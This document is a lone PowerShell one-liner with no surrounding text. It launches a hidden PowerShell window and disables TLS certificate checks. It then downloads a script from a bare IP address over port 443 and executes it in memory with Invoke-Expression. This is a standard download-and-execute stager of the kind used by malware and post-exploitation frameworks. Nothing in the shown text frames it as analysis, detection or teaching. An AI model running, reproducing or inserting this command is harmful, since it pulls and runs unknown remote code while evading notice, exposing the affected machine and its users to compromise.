powershell.exe -nop -w hidden -c "[Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}; IEX ((new-object net.webclient).downloadstring('https://104.41.172.78:443/a'))"
